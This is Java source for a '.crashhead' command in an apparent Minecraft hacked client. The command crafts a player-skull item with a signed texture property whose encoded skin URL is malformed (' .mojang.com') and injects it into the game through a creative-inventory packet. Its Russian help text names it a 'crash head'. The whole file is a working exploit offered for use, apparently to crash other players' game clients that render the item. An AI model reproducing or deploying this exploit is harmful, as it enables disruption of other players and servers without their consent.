package me.aristhena.client.command.commands;

import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import me.aristhena.client.command.*;
import net.minecraft.client.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

@Com(names = { "crashhead" })
public class CrashHead extends Command
{
    public static final String BYPASSCRASHVALUE = "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByb2ZpbGVJZCI6ImZkZWI1ZjVlYzQ5ODRkNTM4MGIzMjVlNDMwNTEzZGIyIiwicHJvZmlsZU5hbWUiOiJHYXJrb2x5bSIsInNpZ25hdHVyZVJlcXVpcmVkIjp0cnVlLCJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6IiAubW9qYW5nLmNvbSJ9fX0=";
    
    @Override
    public String getHelp() {
        return ".crashhead - Получить краш-голову. (Только в креативе)";
    }
    
    @Override
    public void runCommand(final String[] args) {
        final ItemStack itm = new ItemStack(Items.skull, 1, 3);
        final NBTTagCompound base = new NBTTagCompound();
        final NBTTagCompound skullOwner = new NBTTagCompound();
        skullOwner.setString("Id", "fdeb5f5e-c498-4d53-80b3-25e430513db2");
        skullOwner.setString("Name", "Garkolym");
        final NBTTagCompound properties = new NBTTagCompound();
        final NBTTagList textures = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        tag.setString("Signature", "Ff/owu5QIoK1DoqJaJPcYTkNlIqH0JGvsKz8sAnaxOX0OCKk0WkfYxDWDnhu+SaTNzwgaEMkr82dHpJ3dL1OD+GRPkkzDbeEMe6JHZeZOOHQE5pCe1YhL0AvK+UCy2Cliztj3oavr0LxWcW0HuoCsYk80jTcjcBY8um3NlwNZtrfEd44B+XEQ1BNk7Ypf0XNy5N6iOp0UFGue6CoDLNzFuVfLu54xXQlcHVylTEtNv1rJOT4K3p3szdIvQjdjh8n2zFdwjfACFovqk2kKW0aizBvWUS8/F3yeY2+P1gUFXDHAfQ3i70i0FjPy05eB8qIIxrfP/HBmm7eLDYjy3GcUwpxTBKYU/92OIkCJttaiJh6A0jF9AVDJSJv1qu2OguzQIHod3Wf1ZgpnBLEOSjJ0wDMK9tZbN6EDGEAReBhOi/qNL3jGlE9+1TdubVWgmih3iOI3QjozRNvzXpExWQQ4yOsrwnohYTJ8ajIdph3bcMTqcgbkZKG2iyqOJHmKT6YT9d/MAZ6HlJqZNUcn77N6jy7wBHYuvsSTlsfT5s+NuDDPfv3Z480fx0wSYrjbCYtE7q7FQbnxWoJhSYwdq2/1aqyv4YqLhbbek2VYh05ucM8xprsYCbXVvFylwt07sur24SrSi9tWF9UqR9VJsTTB/jtq7nVeLzSfh4UnXWFDu0=");
        tag.setString("Value", "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByb2ZpbGVJZCI6ImZkZWI1ZjVlYzQ5ODRkNTM4MGIzMjVlNDMwNTEzZGIyIiwicHJvZmlsZU5hbWUiOiJHYXJrb2x5bSIsInNpZ25hdHVyZVJlcXVpcmVkIjp0cnVlLCJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6IiAubW9qYW5nLmNvbSJ9fX0=");
        textures.appendTag(tag);
        properties.setTag("textures", textures);
        skullOwner.setTag("Properties", properties);
        base.setTag("SkullOwner", skullOwner);
        itm.setTagCompound(base);
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itm));
    }
}
